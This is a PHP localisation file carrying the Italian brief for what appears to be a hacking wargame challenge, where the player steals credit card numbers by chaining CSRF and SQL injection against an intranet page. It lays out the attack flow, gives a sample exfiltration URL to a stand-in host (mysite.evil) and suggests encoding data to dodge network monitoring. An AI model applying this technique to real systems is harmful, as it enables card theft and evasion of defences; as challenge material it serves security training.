<?php
$lang = array(
'index_title' => 'La tua missione',
'index_info' =>
'la tua missione è quella di rubare i numeri di carta di credito e i corrispettivi CVV da un istituto finanziari internazionale. Per prima cosa, hai frugato tra i cassonetti trovando alcuni documenti importanti. I documenti riguardano un recente audit per la sicurezza. Leggendo tra i file dell\'audit hai trovato che uno dei siti web dell\'Intranet <a href="query.include">(http://very-secure-intranet.local/query.php?id=)</a> è vulnerabile ad SQL injection e CSRF, e questo sito è connesso con il database delle carte di credito. La pagina query.php ritorna informazioni inutili per te ma, con la vulnerabilità SQL injection, è un tesoro :). Puoi anche ottenere la struttura del database delle carte di credito (create table credit_card(id int, cc_number bigint,cvv integer);). La brutta notiza è che è impossibile accedere alla rete very-secure-intranet.local dall\'esterno (sia da Internet che cercando di entrare nell\'edificio). E, anche se riuscissi ad accedere alla rete very-secure-intranet.local, ti servirebbero le credenziali per identificarti al sito. L\'autenticaizone è trasparente per gli utenti locali, ma non per te. Ti serve un piano differente.<br/>
Ma grazie a dio hai avuto una brillante idea. Puoi creare una pagina HTML (forum.html), pubblicarla su Integer e convincere uno degi utenti dell\'istituto finanziario (Z :-)) a visitare il sito web con la pagina speciale forum.html. Siccome pagina vulnerabilie query.php (sulla rete very-secure-intranet.local) può ricevere parametri tramite GET (quindi è vulnerabile a CSRF), puoi inserire un oggetto (o un tag) nell\'HTLM per eseguire la SQL injection per te. La parte migliore è che, se crei una special query SQL, dove i numeri di carta di credito sono concatenati con altri tag HTML, puoi forzare il browser della vittima a fare richieste ad un webserver controllato da te (http://www.mysite.evil/log.php).<br/> 
<br/>
Ecco il flusso logico dettagliato dell\'attacco.<br/>
<br/>
1. Invii un semplice link alla vittima, il link deve finire con forum.html<br/>
2. L\'impiegato vittima clicca sul link a forum.html (e quello è l\'unico click richiesto da parte della vittima) e scarica forum.html<br/>
3. Il browser della vittima analizza l\'HTML e trova il link special alla pagina <a href="query.include">(http://very-secure-intranet.local/query.php?id=)</a>....<br/>
(puoi anche vederlo <a href="index.php?highlight=christmas">evidenziato qui</a>).<br/>
4. Questo link sfrutta sia la vulnerabilità CSRF che quella di SQL injection sulla rete very-secure-intranet.local<br/>
5. Il sito very-secure-intranet.local ritorna la pagina HTML in cui sono inseriti il numero di carta di credito e il numero cvv come oggetti speciali, avendo cura di inserire in questi oggetti i riferimenti al tuo sito. per esempio così:<br/>
http://www.mysite.evil/log.php?cc_number=1111222233334444&cvv=423<br/>
Il formato è un esempio, puoi usare qualsiasi cosa dopo http://www.mysite.evil/ (è fisso perchè rende più semplice il test della sfida :) ), ma deve contenere il numero di carta di credito e il codice cvv. Dovresti essere in grado di ricevere sul tuo sito tutte le informazioni salvate nella tabella delle carte di credito (e non solo pezzi di esse).<br/> 
<br/>
Obiettivo opzionale: La rete dela vittima è auto-monitorata e un allarme è generato se c\'è un numero di carta di credito inviato in chiaro sulla rete. Il tuo obiettivo aggiuntivo è quello di evitare questo controllo utilizzando un qualsiasi tipo di codifica/crittazione.<br/>
<br/>
Per risolvere questa sfida, devi crare questa pagina forum.html, pubblicarla da qualsiasi parte su Internet (anche in formato scaricabile), ed inviare un PM a Z con il link a forum.html. Z controllerà la tua soluzione e, se funziona, ti invierà la soluzione della sfida. Per maggiori informazioni, dai un occhiata agli aiuti pubblicati nella sezione di aiuto.<br/>
<br/>
Buona fortuna :)<br/>',

'thanks' => 'Grazie a %1$s e %2$s per i loro sforzi nel BetaTesting.',

);
?>